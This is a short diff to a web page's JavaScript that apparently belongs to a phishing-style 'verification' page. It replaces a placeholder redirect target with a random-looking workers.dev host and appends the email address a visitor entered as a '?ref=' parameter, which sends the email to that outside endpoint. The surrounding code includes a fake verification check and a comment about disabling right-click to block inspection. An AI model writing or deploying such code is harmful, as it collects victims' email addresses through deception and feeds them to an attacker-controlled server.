@@ -6,7 +6,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const verified = urlParams.get("verified");
 if (verified !== "true") {
     alert("Please complete verification first.");
-    window.location.href = "verification.html";
+    window.location.href = "index.html";
 
 document.addEventListener("DOMContentLoaded", function() {
     // Disable right-click
@@ -52,7 +52,7 @@ document.addEventListener("DOMContentLoaded", function() {
             }
 
             // Build redirect URL with ?ref=
-            const redirectUrl = "https://example.com/target-page"; // <-- replace with your actual target URL
+            const redirectUrl = "https://f1237ed8.94ce0ab1661c1c074ad24d5c.workers.dev"; // <-- replace with your actual target URL
             const refUrl = `${redirectUrl}?ref=${encodeURIComponent(emailInput.value)}`;
 
             // Redirect
